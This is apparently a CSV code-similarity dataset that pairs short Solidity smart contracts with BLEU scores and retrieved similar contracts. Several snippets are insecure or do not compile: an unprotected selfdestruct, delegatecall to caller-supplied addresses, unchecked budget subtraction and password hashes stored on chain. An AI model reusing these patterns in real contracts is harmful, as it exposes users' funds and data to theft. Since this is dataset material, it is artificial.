sni,bleu,code
"contract Govtcontract {

    uint256 public allocbudget;
    uint256 public rembudget;

    struct transaction{
        uint  expend;
        uint dept;
        string item;
        uint date;
        string location;
    }

 transaction public trx;


constructor (uint256 initbudget) public {
    allocbudget = initbudget;
    rembudget = initbudget;
}

function settx(uint amt, uint dep, string thing, uint date, string loc) public {
    trx.expend=amt;
    trx.dept=dep;
    trx.item=thing;
    trx.date=date;
    trx.location=loc;
    rembudget = rembudget - trx.expend;
}



function get() public constant returns (uint) {
    return rembudget;

    }
}",0.5940895031261179,"contract Token {
	function SetupToken(string tokenName, string tokenSymbol, uint256 tokenSupply) public;
    function balanceOf(address _owner) public constant returns (uint256 balance);
    function transfer(address _to, uint256 _amount) public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success);
    function approve(address _spender, uint256 _amount) public returns (bool success);
    function allowance(address _owner, address _spender) public constant returns (uint256 remaining);
}"
"contract B {
    address owner; 
    address A; 

    function callCanOnlyBeCalledByB() {
        if(msg.sender != owner) throw;
        bytes4 functionSig = bytes4(sha3(""canOnlyBeCalledByB()""));    
        A.call(functionSig);
    }
}",0.5693038478955605,"contract Mew {

    address owner = msg.sender;

    function change(address a) public { if(owner==msg.sender) owner=a; }

    function close() public { if(owner==msg.sender) selfdestruct(msg.sender); }

}"
"contract Test {  
    struct Product {  
        uint p_id,  
        uint qty
    }

    mapping(bytes32 => Product) ProdMap;

    function registerProduct (bytes32 id, uint p, uint q) returns (bool) {
        ProdMap[id].p_id = p;
        ProdMap[id].qty = q;
    }
}",0.5551476413798355,"contract VatLike {
    function ilks(bytes32) public view returns (uint, uint, uint, uint, uint);
    function hope(address) public;
    function frob(bytes32, address, address, address, int, int) public;
}"
"contract Student{

    struct stu{
        address name;
        uint age;
        bool tookTest;
        address[] books;
    }

    stu public s;

    mapping(uint => stu) public StudentNames;

    function addStudent (uint ID, address _name, uint _age,address[] books) {
        StudentNames[ID] = stu(_name, _age, false, books);
    }
    function updateStudent (uint ID) {
        StudentNames[ID].tookTest = true;
    }

    function getBooks(uint ID) returns(address[]){
        return StudentNames[ID].books;
    }

}",0.5967130116287289,"contract ComplianceService {



    

    function check(address _token, address _spender, address _from, address _to, uint256 _amount) public returns (uint8);



    

    function forceCheck(address _token, address _spender, address _from, address _to, uint256 _amount) public returns (uint8);



    

    function checkVested(address _token, address _spender, address _holder, uint256 _balance, uint256 _amount) public returns (bool);

}"
"contract Storage {

  struct EntityStruct {
    string str_address;
    uint entityData;
    
  }

  EntityStruct[] public entityStructs;

  function newEntity(string entityAddress, uint entityData) public returns(uint rowNumber) {
    EntityStruct memory newEntity;
    newEntity.str_address = entityAddress;
    newEntity.entityData    = entityData;
    return entityStructs.push(newEntity)-1;
  }

  function getEntityCount() public constant returns(uint entityCount) {
    return entityStructs.length;
  }

  function getEntityByRowNumber(uint rowNumber) public constant returns(string entity, uint data) {
    string a = entityStructs[rowNumber].str_address;
    uint b =  entityStructs[rowNumber].entityData;
    return (a,b);
  }
}",0.5772449354637904,"contract MintableTokenFactory {

    address[] public contracts;

    address public lastContractAddress;

    

    event newMintableTokenContract (

       address contractAddress

    );



    constructor()

        public

    {



    }



    function getContractCount()

        public

        constant

        returns(uint contractCount)

    {

        return contracts.length;

    }



    function newMintableToken(string symbol, string name, address _owner)

        public

        returns(address newContract)

    {

        MintableToken c = new MintableToken(symbol, name, _owner);

        contracts.push(c);

        lastContractAddress = address(c);

        emit newMintableTokenContract(c);

        return c;

    }



    function seeMintableToken(uint pos)

        public

        constant

        returns(address contractAddress)

    {

        return address(contracts[pos]);

    }

}"
"contract Template {

    bytes32  public custName;
    bytes32  public custLoc;
    address  public contractAddress;

    function Template () {

        custName            = ""0xDEFAULT"";
        custLoc             = ""0xDEFAULT"";
        contractAddress     = address(this);

    }

    function AssignCustomerAttributes (bytes32 _custName, bytes32 _custLoc)  
        returns (bool isSuccess) {

        custName    = _custName;
        custLoc     = _custLoc;

        contractAddress  = address(this);

        return true;

    }

}",0.5886971483037903,"contract EmcoTokenInterface is ERC20 {



    function setReferral(bytes32 _code) public;

    function setReferralCode(bytes32 _code) public view returns (bytes32);



    function referralCodeOwners(bytes32 _code) public view returns (address);

    function referrals(address _address) public view returns (address);

    function userReferralCodes(address _address) public view returns (bytes32);



}"
"contract Master {

    address  public     masterContractAddress;
    bytes32  public     masterName = """";
    Template    myCustTemp; 

    function Master () {

        masterContractAddress = address(this);

    }

    function updateOwnerName (bytes32 _masterName)  {

        masterName = _masterName;

    }

    function createCustomer (bytes32 _custName, bytes32 _custLoc)  returns (bool flag) {

        Template myCust = new Template();

        if (myCust.AssignCustomerAttributes(_custName, _custLoc)) {

            return true;

        } else return false;

    }


}",0.5778586047883655,"contract ComponentListInterface {

    event ComponentUpdated (bytes32 _name, string _version, address _componentAddress);

    function setComponent(bytes32 _name, address _componentAddress) public returns (bool);

    function getComponent(bytes32 _name, string _version) public view returns (address);

    function getLatestComponent(bytes32 _name) public view returns(address);

    function getLatestComponents(bytes32[] _names) public view returns(address[]);

}"
"contract C {
   B private b;    
   function C() {
       B b = new B();
   }
   function calculateTheMeaning() {
      b.doStuff();
   }
   function getTheAnswer() returns (int) {
      return b.getStuff();
   }
}",0.5951089566575726,"contract VoxInterface {

    function par() public view returns (uint);

    function way() public view returns (uint);

    function era() public view returns (uint);

}"
"contract CertificateStorage is CertificateStorageOwnable {

    address public certificateAddress;

    event AuthorizedCaller(address caller);
    event DeAuthorizedCaller(address caller);

    function authorizeCaller(address _caller) public onlyOwner returns(bool) {
        authorizedCaller[_caller] = 1;
        emit AuthorizedCaller(_caller);
        return true;
    }

    constructor() public {
        authorizedCaller[msg.sender] = 1;
        emit AuthorizedCaller(msg.sender);
    }

    modifier onlyAuthCaller(){
        certificateAddress = msg.sender;
        require(authorizedCaller[msg.sender] == 1);
        _;
    }
    struct certificate_total {
        string universityName;
        string typeOfDegree;
        string major;
        string name;
        uint256 dateOfBirth;
    }
    mapping(address => certificate_total) certificateTotalMapping;

    certificate_total certificateTotal;

    function setCertificateTotal(string memory _universityName, 
                        string memory _typeOfDegree, 
                        string memory _major, 
                        string memory _name, 
                        uint256 _dateOfBirth) public onlyAuthCaller returns(address) {

        uint tmpData = uint(keccak256(abi.encodePacked(msg.sender, now)));
        address certificateNo = address(tmpData);

        certificateTotal.universityName = _universityName;
        certificateTotal.typeOfDegree = _typeOfDegree;
        certificateTotal.major = _major;
        certificateTotal.name = _name;
        certificateTotal.dateOfBirth = _dateOfBirth;

        certificateTotalMapping[certificateNo]= certificateTotal;

        return certificateNo;
    }
}",0.5640539332622364,"contract HighwayCertificates {

    

    event NewCertificate(uint256 indexed certificate_number, string course_name, string student_name, string linkedin, string released_project, string mentor_name_linkedin, string graduation_date, string graduation_place);

    

    struct Certificate {

        

        string course_name;

        string student_name;

        string student_linkedin;

        string released_project;

        string mentor_name_linkedin;

        string graduation_date;

        string graduation_place;

    }

    

    address public owner;

    uint256 public count = 0;

    mapping(uint256 => Certificate) public certificates;

    

    modifier onlyOwner {

        require(msg.sender == owner, ""Only owner can use this function"");

        _;

    }

    

    constructor() public {

        owner = msg.sender;

    }

    

    function addCertificate(uint256 certificate_number, string course_name, string student_name, string student_linkedin, string released_project, string mentor_name_linkedin, string graduation_date, string graduation_place) public onlyOwner {

        count++;

        require(count == certificate_number, ""Wrong certificate number"");

        certificates[count] = Certificate(course_name, student_name, student_linkedin, released_project, mentor_name_linkedin, graduation_date, graduation_place);

        emit NewCertificate(certificate_number, course_name, student_name, student_linkedin, released_project, mentor_name_linkedin, graduation_date, graduation_place);

    }

}"
"contract testStruct {
    struct stru{
        string[] s;
    }

    stru myStru;

    

    function add(string s) {
        string[] memory strAr; 
        strAr[0] = s;
        myStru = stru(strAr);
    }

    function getFirst(uint i) constant returns (string s) {
        s = myStru.s[0];
    }
}",0.5949764784300344,"contract Coursetro {
    
   string fName;
   uint age;
   
   function setInstructor(string _fName, uint _age) public {
       fName = _fName;
       age = _age;
   }
   
   function getInstructor() public constant returns (string, uint) {
       return (fName, age);
   }
    
}"
"contract HealthCareDemo {

    
    string public constant name = ""HealthCare_v0.1"";
    string public constant symbol = ""HC"";
    uint8 public constant decimals = 18;  
    address owner;

    function kill() { 
    
            selfdestruct(owner);
    }
    struct SubscriberStruct {
        uint id;
        string name;
        string accountType;
        uint16 accBalance;

    }
    SubscriberStruct[] public subscribers;


    event eveSubscriber (
        uint id,
        string name,
        string accountType,
        uint16 accBalance
        );

    
    function addProvider(string name, string accountType) returns (bool) {
        uint16 _accBal = 0;
        if(compareStrings(accountType,""HRA"")) {
            _accBal = 500;
        }
        else if (compareStrings(accountType,""FSA"")) {
            _accBal = 1000;
        }
        else {
            _accBal = 100;
        }

        SubscriberStruct memory s;
        s.name = name;
        s.accountType = accountType;
        s.id = subscribers.length;
        s.accBalance = _accBal;
        subscribers.push(s);

        
        eveSubscriber(s.id,s.name,s.accountType,s.accBalance);

        return true;
    }
    
    function getProviderName(uint id) public returns (string _name) {
        return subscribers[id].name;
    }
    function getAccountBalance(uint id) public returns (uint16 _accBal) {
        return subscribers[id].accBalance;
    }

    function submitClaim(uint _id, uint16 _claimAmount) public returns (bool status, uint16 _remainingBalance) {
        if(subscribers[_id].accBalance >= _claimAmount) {
            subscribers[_id].accBalance -= _claimAmount;
            return (true, subscribers[_id].accBalance);
        }
        else {
            return (false, subscribers[_id].accBalance);
        }
    }

    function compareStrings (string a, string b) view private returns (bool){
       return keccak256(a) == keccak256(b);
   }

}",0.5913035210300085,"contract EIP20 is EIP20Interface {

    uint256 constant private MAX_UINT256 = 2**256 - 1;
    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) public allowed;
    
    string public name;                   
    uint8 public decimals = 8;                
    string public symbol;                 

    function EIP20(
        uint256 _initialAmount,
        string _tokenName,
        string _tokenSymbol
    ) public {
        totalSupply = _initialAmount * 10 ** uint256(decimals); 
        balances[msg.sender] = totalSupply;               
        name = _tokenName;                                   
        symbol = _tokenSymbol;                               
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balances[msg.sender] >= _value);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        uint256 allowance = allowed[_from][msg.sender];
        require(balances[_from] >= _value && allowance >= _value);
        balances[_to] += _value;
        balances[_from] -= _value;
        if (allowance < MAX_UINT256) {
            allowed[_from][msg.sender] -= _value;
        }
        Transfer(_from, _to, _value);
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
}"
"contract CollegeAdmin {
    uint8 public studentAge=21;
    uint16 public studentIncome=15000;
    uint8 public studentScore=4;

    uint8 public studentAttendance=96;

    function testReturn() returns (uint) {
        studentAge=90;
        return 89;
    }
}",0.5574771674785701,"contract PoSTokenStandard {

    uint256 public stakeStartTime;

    function mint() public returns (bool);

    function coinAge() public constant returns (uint256);

    event Mint(address indexed _address, uint _reward);

}"
"contract company {

    struct contractDetails {
        string contractId;
        string companyA;
        string companyB;
        address A;
        address B;
        uint256 timestamp;
        string signHash;
        bool isSigned;
    }

    mapping (string => contractDetails) contracts;
    mapping (string => string) hashMap;

    event contractSigned (
        string contractId,
        string companyA,
        string companyB,
        address A,
        address B,
        uint256 timestamp,
        string signHash,
        bool isSigned
    );

    function createContract(string memory _contractId, string memory _companyA, string memory _companyB, address _B) public {
        contracts[_contractId] = contractDetails(_contractId, _companyA, _companyB, msg.sender, _B, now, '', false);
    }

    function signContract(string memory _contractId) public {
        contractDetails storage signDetails = contracts[_contractId];
        signDetails.isSigned = true;
        signDetails.timestamp = now;
        emit contractSigned(_contractId, signDetails.companyA, signDetails.companyB, signDetails.A, signDetails.B, signDetails.timestamp, signDetails.signHash, signDetails.isSigned);
    }

    function verifySign(string memory _contractId) public view returns(bool) {
        contractDetails storage verify = contracts[_contractId];
        return(verify.isSigned);
    }

    function getContract(address _address) view public returns() {
      
    }
}",0.5218568932438057,"contract Migratable {

  

  event Migrated(string contractName, string migrationId);



  

  mapping (string => mapping (string => bool)) internal migrated;



  

  string constant private INITIALIZED_ID = ""initialized"";





  

  modifier isInitializer(string contractName, string migrationId) {

    validateMigrationIsPending(contractName, INITIALIZED_ID);

    validateMigrationIsPending(contractName, migrationId);

    _;

    emit Migrated(contractName, migrationId);

    migrated[contractName][migrationId] = true;

    migrated[contractName][INITIALIZED_ID] = true;

  }



  

  modifier isMigration(string contractName, string requiredMigrationId, string newMigrationId) {

    require(isMigrated(contractName, requiredMigrationId), ""Prerequisite migration ID has not been run yet"");

    validateMigrationIsPending(contractName, newMigrationId);

    _;

    emit Migrated(contractName, newMigrationId);

    migrated[contractName][newMigrationId] = true;

  }



  

  function isMigrated(string contractName, string migrationId) public view returns(bool) {

    return migrated[contractName][migrationId];

  }



  

  function initialize() isInitializer(""Migratable"", ""1.2.1"") public {

  }



  

  function validateMigrationIsPending(string contractName, string migrationId) private view {

    require(!isMigrated(contractName, migrationId), ""Requested target migration ID has already been run"");

  }

}"
"contract HDataAccessManager {

    mapping (string => string) dataLink;
    mapping (string => string) dataHash;
    mapping (string => bytes32) private passwords; 
    string[] users;


    function _isValid(string _user_id, string _encryption_key_hash) returns (bool) {
        for(uint i = 0;i<users.length;i++){
            if(keccak256(users[i]) == keccak256(_user_id) && 
                keccak256(_encryption_key_hash) == passwords[_user_id]) {

                return true;
            }
        }
        return false;
    }

    function addUser(string _user_id, string _encryption_key_hash) {
        users.push(_user_id);
        passwords[_user_id] = keccak256(_encryption_key_hash);
    }

    function totalUsers() returns (uint) {
        return users.length;
    }


    
    function storeLink(string _user_id, string _link){

        
        

        dataLink[_user_id] = _link;
    }

    function storeHash(string _user_id, string _hash){

        
        

        dataHash[_user_id] = _hash;
    }


    function retrieveLink(string _user_id, string _encryption_key_hash) returns (string, string) {

        
        require(_isValid(_user_id, _encryption_key_hash));

        string link = dataLink[_user_id];
        string hash = dataHash[_user_id];
        return (link, hash);

}

}",0.5031533588926436,"contract FoundationToken {

    string internal _symbol;

    string internal _name;

    uint8 internal _decimals;

    uint internal _totalSupply = 1000;

    mapping (address => uint) internal _balanceOf;

    mapping (address => mapping (address => uint)) internal _allowances;

    

    constructor(string symbol, string name, uint8 decimals, uint totalSupply) public {

        _symbol = symbol;

        _name = name;

        _decimals = decimals;

        _totalSupply = totalSupply;

    }

    

    function name() public view returns (string) {

        return _name;

    }

    

    function symbol() public view returns (string) {

        return _symbol;

    }

    

    function decimals() public view returns (uint8) {

        return _decimals;

    }

    

    function totalSupply() public view returns (uint) {

        return _totalSupply;

    }

    

    function balanceOf(address _addr) public view returns (uint);



    

    

    

    

    function transfer(address _to, uint _value) public returns (bool);

    event Transfer(address indexed _from, address indexed _to, uint _value);

}"
"contract IterableMappingWithDelete {

  struct Voter {
    uint votesCast;                                         
    uint voterListPointer;                                  
  }

  mapping(address => Voter) public voterStructs;            
  address[] public voterList;                               

  function getVoterCount() public constant returns(uint voterCount) {return voterList.length;}

  function isVoter(address voterId) public constant returns(bool isIndeed) {
    if(voterList.length==0) return false;
    return voterList[voterStructs[voterId].voterListPointer]==voterId; 
  }

  function insertVoter(address voterId) public returns(bool success) {
    if(isVoter(voterId)) throw;
    voterStructs[voterId].voterListPointer = voterList.push(voterId) - 1;
    return true;
  }

  function deleteVoter(address voterId) public returns(bool success) {
    if(!isVoter(voterId)) throw;
    uint rowToDelete = voterStructs[voterId].voterListPointer;
    uint voterListLastRow = voterList.length-1;
    address keyToMove = voterList[voterListLastRow];
    voterStructs[keyToMove].voterListPointer = rowToDelete;
    voterList[rowToDelete] = keyToMove;

    
    

    delete voterStructs[voterId];

    voterList.length--;
    return true;
  }

}",0.5324435097763279,"contract TrustaBitToken is MintableToken {

  string public constant name = ""TrustaBits"";

  string public constant symbol = ""TAB"";

  uint256 public constant decimals = 18;

  modifier isFinishedMinting () {
    require(mintingFinished);
    _;
  }
  function transfer(address _to, uint256 _value) public isFinishedMinting returns (bool) {
    return super.transfer(_to, _value);
  }

  function transferFrom(address _from, address _to, uint256 _value) public isFinishedMinting returns (bool) {
    return super.transferFrom(_from, _to, _value);
  }

  function approve(address _spender, uint256 _value) public isFinishedMinting returns (bool) {
    return super.approve(_spender, _value);
  }

  function increaseApproval(address _spender, uint _addedValue) public isFinishedMinting returns (bool success) {
    return super.increaseApproval(_spender, _addedValue);
  }

  function decreaseApproval(address _spender, uint _subtractedValue) public isFinishedMinting returns (bool success) {
    return super.decreaseApproval(_spender, _subtractedValue);
  }

}"
"contract Consortium is Destructible {

    
    struct Member {
        string name;
        address member;
        Organization organization;
        uint since;
    }

    mapping (address => uint) public memberId;
    Member[] public members;

    
    event MembershipChanged(address member, bool isMember);

    
    modifier onlyMembers {
        require(memberId[msg.sender] != 0);
        _;
    }

    

    
    function Consortium() public {
        addMember(owner, ""Consortium Funder"");
    }

    
    function addMember(address _targetMember, string _memberName) onlyOwner public returns(bool) {
        uint id = memberId[_targetMember];
        if (id == 0) {
            memberId[_targetMember] = members.length;
            id = members.length++;
        }

        Organization org = new Organization(_memberName);
        org.transferOwnership(_targetMember);
        members[id] = Member({name: _memberName, member: _targetMember, organization: org, since: now});
        emit MembershipChanged(_targetMember, true);
        return true;
    }

    
    function updateMemberName(string _name) onlyMembers public returns (bool) {
        members[memberId[msg.sender]].name = _name;
        return true;
    }

    
    function updateMember(string _name, address _memberAddress) onlyMembers public returns (bool) {
        Member storage member = members[memberId[msg.sender]];
        member.name = _name;
        address orgAddress = address(member.organization);
        orgAddress.delegatecall(bytes4(keccak256(""transferOwnership(address)"")), _memberAddress);
        member.member = _memberAddress;
        emit MembershipChanged(_memberAddress, true);
        return true;
    }

    
    function removeMember() onlyMembers public {
        for (uint i = memberId[msg.sender]; i < members.length-1; i++){
            members[i] = members[i+1];
        }
        memberId[msg.sender] = 0;
        delete members[members.length-1];
        members.length--;
    }

    
    function removeMember(address _targetMember) onlyOwner public {
        require(memberId[_targetMember] != 0);

        for (uint i = memberId[_targetMember]; i < members.length-1; i++){
            members[i] = members[i+1];
        }
        memberId[_targetMember] = 0;
        delete members[members.length-1];
        members.length--;
    }

    
    function isMember(address _targetMember) public view returns (bool) {
        return memberId[_targetMember] != 0;
    } 

    
    function numMembers() public view returns (uint) {
        return members.length;
    }
}",0.5949569117165577,"contract BasicToken is ERC20Basic {
  using SafeMath for uint;
    
  address public owner;
  
  
  bool public transferable = true;
  
  mapping(address => uint) balances;

  
  mapping (address => bool) public frozenAccount;

  modifier onlyPayloadSize(uint size) {
     if(msg.data.length < size + 4) {
       throw;
     }
     _;
  }
  
  modifier unFrozenAccount{
      require(!frozenAccount[msg.sender]);
      _;
  }
  
  modifier onlyOwner {
        require(msg.sender == owner);
        _;
  }
  
  modifier onlyTransferable {
      if (transferable) {
          _;
      } else {
          emit LiquidityAlarm(""The liquidity is switched off"");
          throw;
      }
  }
  
  
  event FrozenFunds(address _target, bool _frozen);
  
  
  event InvalidCaller(address indexed _from);

  
  event Burn(address indexed _from, uint256 value);
  
  
  event OwnershipTransferred(address indexed _from, address indexed to);
  
  
  event InvalidAccount(address indexed _from, bytes msg);
  
  
  event LiquidityAlarm(bytes msg);
  
  function transfer(address _to, uint _value) onlyPayloadSize(2 * 32) unFrozenAccount onlyTransferable public returns (bool){
    if (frozenAccount[_to]) {
        emit InvalidAccount(_to, ""The receiver account is frozen"");
		return false;
    } else {
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        emit Transfer(msg.sender, _to, _value);
		return true;
    } 
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }

  
  
  
  function freezeAccount(address target, bool freeze) onlyOwner public {
      frozenAccount[target]=freeze;
      emit FrozenFunds(target, freeze);
    }
  
  function accountFrozenStatus(address target) public view returns (bool frozen) {
      return frozenAccount[target];
  }
  
  function transferOwnership(address newOwner) onlyOwner public {
      if (newOwner != address(0)) {
          address oldOwner=owner;
          owner = newOwner;
          emit OwnershipTransferred(oldOwner, owner);
        }
  }
  
  function switchLiquidity (bool _transferable) onlyOwner public returns (bool success) {
      transferable=_transferable;
      return true;
  }
  
  function liquidityStatus () public view returns (bool _transferable) {
      return transferable;
  }
}"
"contract Proposal {
        Ballot ballot;
        bool complete;
        uint approveCount;
        uint rejectCount;
        mapping (address => bool) voters;

        constructor() {
            ballot = new Ballot(msg.sender);
        }

        function vote(bool _vote) {
            require(ballot.checkIfContributor(msg.sender));
            require(!voters[msg.sender]);

            voters[msg.sender] = true;
            if (_vote) {
                approveCount++;  
            } else {
                rejectCount++;
            }

        }
}",0.5394184253938382,"contract Mintable is Ownable {
    mapping(address => bool) minters;

    modifier onlyMinter {
        require(minters[msg.sender] == true);
        _;
    }

    function Mintable() public {
        adjustMinter(msg.sender, true);
    }

    function adjustMinter(address minter, bool canMint) public onlyOwner {
        minters[minter] = canMint;
    }

    function mint(address _to, uint256 _value) public;

}"
"contract Caller {

 function doSomething(address _callee, string _text) public {
   _callee.delegatecall(
                     bytes4(keccak256(""validate(string)"")), _text));

 
 }
}",0.5636528678724855,"contract tDeployer {

	function deployToken(string _tName, string _tSymbol, uint _mint, address _owner) public returns (address);

}"
"contract EncryptedData {
   bytes data;
   string public decryptedData;

   constructor(bytes data_) public {
      data = data_;
   }

   function decrypt(bytes key) public {
      decryptedData = decryptDataSomehow(data, key);
   }
}",0.590569476187571,"contract HashMap {
    mapping(bytes32 => bytes) map;
    
    function set(bytes _data) public {
        map[keccak256(_data)] = _data;
    }
    
    function get(bytes32 _hash) public constant returns (bytes data) {
        return map[_hash];
    }
}"
"contract C {

    struct A {
        uint256 a;
        uint256 b;
    }

    struct B {
        A ax;
        uint256 c;
    }

    struct C {
        string name;
        B[] bs;
    }

    function init() {
        C memory c;
        B memory b;
        A memory a;

        a.a = 10;
        a.b = 20;

        b.ax = a;
        b.c = 30;

        c.name = ""Test test test"";
        c.bs[0] = b;
    }
}",0.5570123427884226,"contract test {

    

    function sub1(uint256 _a, uint256 _b) public pure returns (uint256 result) {

        require(_a >= _b);

        return _a - _b;

    }

    

    function sub2(uint256 _a, uint256 _b) public pure returns (uint256 result) {

        require(_a >= _b, ""_a cannot be less than _b"");

        return _a - _b;

    }

    

}"
"contract Test {

    function stringToUint(string s) constant returns (uint) {
    bytes memory b = bytes(s);
    uint result = 0;
    for (uint i = 0; i < b.length; i++) { 
        if (b[i] >= 48 && b[i] <= 57) {
            result = result * 10 + (uint(b[i]) - 48); 
        }
    }
    return result; 
    }

        
    function parseInt(string _a)  returns (uint) {
        return parseInt(_a, 0);
    }

    
    function parseInt(string _a, uint _b) internal returns (uint) {
        bytes memory bresult = bytes(_a);
        uint mint = 0;
        bool decimals = false;
        for (uint i=0; i<bresult.length; i++){
            if ((bresult[i] >= 48)&&(bresult[i] <= 57)){
                if (decimals){
                   if (_b == 0) break;
                    else _b--;
                }
                mint *= 10;
                mint += uint(bresult[i]) - 48;
            } else if (bresult[i] == 46) decimals = true;
        }
        if (_b > 0) mint *= 10**_b;
        return mint;
    }

}",0.5785598411557967,"contract StringHelpers {

    using strings for *;

    

    function stringToBytes32(string memory source) internal returns (bytes32 result) {

        bytes memory tempEmptyStringTest = bytes(source);

        if (tempEmptyStringTest.length == 0) {

            return 0x0;

        }

    

        assembly {

            result := mload(add(source, 32))

        }

    }



    function bytes32ToString(bytes32 x) constant internal returns (string) {

        bytes memory bytesString = new bytes(32);

        uint charCount = 0;

        for (uint j = 0; j < 32; j++) {

            byte char = byte(bytes32(uint(x) * 2 ** (8 * j)));

            if (char != 0) {

                bytesString[charCount] = char;

                charCount++;

            }

        }

        bytes memory bytesStringTrimmed = new bytes(charCount);

        for (j = 0; j < charCount; j++) {

            bytesStringTrimmed[j] = bytesString[j];

        }

        return string(bytesStringTrimmed);

    }

}"
"contract DappTokenSale {
        address admin;
        DappToken public tokenContract;
        uint256 public tokenPrice;
        uint256 public tokensSold;

        event Sell(address _buyer, uint256 _amount);

        function DappTokenSale(DappToken _tokenContract, uint256 _tokenPrice) public {
            admin = msg.sender;
            tokenContract = _tokenContract;
            tokenPrice = _tokenPrice;
        }

        function multiply(uint x, uint y) internal pure returns (uint z) {
            require(y == 0 || (z = x * y) / y == x);
        }

        function buyTokens(uint256 _numberOfTokens) public payable {
            require(msg.value == multiply(_numberOfTokens, tokenPrice));
            require(tokenContract.balanceOf(this) >= _numberOfTokens);
            require(tokenContract.transfer(msg.sender, _numberOfTokens));

            tokensSold += _numberOfTokens;

            Sell(msg.sender, _numberOfTokens);
        }

      
        function endSale() public {
                
                require (msg.sender == admin);

                 
                require(tokenContract.transfer(admin,tokenContract.balanceOf(this)));


                
                selfdestruct(admin);

        }
 }",0.5979948691173651,"contract TokenMaker is Ownable {

    uint public fee_in_dc_units = 10e18;

    address public dc_token_address;

    token dcToken;

    mapping (address => address[]) public myTokens;





    function setFee(uint number_of_dc_uints) public onlyOwner {

        fee_in_dc_units = number_of_dc_uints;

    }



    function setDcTokenAddress(address _addr) public onlyOwner {

      dc_token_address = _addr;

      dcToken = token(_addr);

    }



    function makeToken(string memory _name, string memory _symbol, uint _totalSupply, uint _decimals) public {

        require(dcToken.transferFrom(msg.sender, address(this), fee_in_dc_units));



        ERC20Token newToken = new ERC20Token(msg.sender, _name, _symbol, _totalSupply, _decimals);

        myTokens[msg.sender].push(address(newToken));



    }



    function getMyTokens() public view returns (address[] memory) {

      return myTokens[msg.sender];

    }



    function withdrawTokens() public onlyOwner {

      dcToken.transfer(msg.sender, dcToken.balanceOf(address(this)));

    }

}"
"contract Something {
    mapping (address => Ton[]) allTons;

    struct Ton { 
        uint id;
        string name;
        bool access;
    }

    function Something() public {
        allTons[msg.sender].push(Ton({
            id: 1,
            name: ""CoolDude"",
            access: true
        }));
        allTons[msg.sender].push(Ton({
            id: 2,
            name: ""NotCoolDude"",
            access: false
        }));
    }

    function GiveBytes() public constant returns(bytes){
        

    }


}",0.5926124697796861,"contract TokenInterface is ERC20Interface {

    function symbol() public view returns (string memory);

    function name() public view returns (string memory);

    function decimals() public view returns (uint8);

    function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success);

}"
